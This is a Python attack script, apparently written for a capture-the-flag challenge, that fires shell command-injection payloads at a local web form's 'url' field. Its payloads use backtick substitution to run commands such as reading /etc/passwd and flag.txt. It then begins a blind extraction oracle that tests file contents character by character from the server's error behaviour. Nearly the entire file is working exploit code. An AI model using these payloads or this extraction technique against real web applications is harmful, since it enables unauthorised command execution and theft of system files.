import requests

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send(payload):
    data = f"url={payload}"
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        return resp.status_code, len(resp.text), resp.text[:150]
    except Exception as e:
        return "ERROR", 0, str(e)[:80]

print("[+] Understanding what causes ERROR vs 200 response")
print("="*60)

# Systematic test of what breaks the request
test_payloads = [
    # Simple values
    ("1", "just 1"),
    ("a", "just a"),
    ("test", "just test"),
    
    # Command output with single char
    ("`echo 1`", "echo 1 (single digit)"),
    ("`echo a`", "echo a (single letter)"),
    ("`echo ""`", "echo empty"),
    ("`echo -n 1`", "echo -n 1 (no newline)"),
    
    # Multi-char output
    ("`echo 12`", "echo 12"),
    ("`echo hello`", "echo hello"),
    ("`echo abc`", "echo abc (3 chars)"),
    ("`echo abcd`", "echo abcd (4 chars)"),
    
    # Command substitution with real data
    ("`cat /etc/passwd`", "cat /etc/passwd"),
    ("`head -1 /etc/passwd`", "head -1 /etc/passwd"),
    ("`head -c 10 /etc/passwd`", "head -c 10 /etc/passwd"),
    ("`head -c 1 /etc/passwd`", "head -c 1 /etc/passwd"),
    ("`head -c 100 /etc/passwd`", "head -c 100 /etc/passwd"),
    
    # File reading tests
    ("`cat flag.txt`", "cat flag.txt"),
    ("`cat /app/flag.txt`", "cat /app/flag.txt"),
    
    # Exit codes
    ("`true`", "true command"),
    ("`false`", "false command"),
    
    # Variable handling
    ("`$?`", "exit code variable"),
    
    # Number check
    ("`echo 12345`", "echo 12345 (digits)"),
    ("`echo 1234567890`", "echo 12345678910"),
]

results = []
for payload, desc in test_payloads:
    status, length, text = send(payload)
    results.append((desc, payload, status, length))
    indicator = "✓" if status == "ERROR" else "○"
    print(f"{indicator} {desc}: Status={status}, Length={length}")

# Group results
print("\n" + "="*60)
print("[ANALYSIS]")
print("="*60)

error_cases = [r for r in results if r[2] == "ERROR"]
ok_cases = [r for r in results if r[2] == 200]

print(f"\nERROR responses ({len(error_cases)}):")
for desc, payload, status, length in error_cases:
    print(f"  - {desc}: {payload!r}")

print(f"\nOK (200) responses ({len(ok_cases)}):")
for desc, payload, status, length in ok_cases[:8]:  # Limit output
    print(f"  - {desc}")

# If we see a pattern with numeric output, test it
print("\n" + "="*60)
print("[PATTERN TEST] Numeric digits in output")
print("="*60)

digit_tests = []
for i in range(0, 20):
    payload = f"`echo {i}`"
    status, length, text = send(payload)
    digit_tests.append((i, status, length))
    marker = "ERROR" if status == "ERROR" else "200"
    print(f"Digit {i}: {marker}")

# Check which digits cause ERROR
error_digits = [t[0] for t in digit_tests if t[1] == "ERROR"]
print(f"\nDigits causing ERROR: {error_digits}")

# If specific digits cause error, check if we can use this for extraction
if error_digits:
    print("\n[+] Testing blind data extraction using digit error pattern")
    # If digit in string causes ERROR, we can test character by character
    
    # Test: try to detect if first char of file is numeric
    char_tests = [
        ("`head -c 1 /etc/passwd | grep -q [0-9] && echo 00`", "passwd starts with digit"),
        ("`head -c 1 /etc/passwd | grep -q [a-z] && echo 00`", "passwd starts with lowercase"),
        ("`head -c 1 /etc/hosts | grep -q [0-9] && echo 00`", "hosts starts with digit"),
    ]
    
    print("\n[CHARACTER TESTS]")
    for payload, desc in char_tests:
        status, length, text = send(payload)
        print(f"{desc}: {status}")


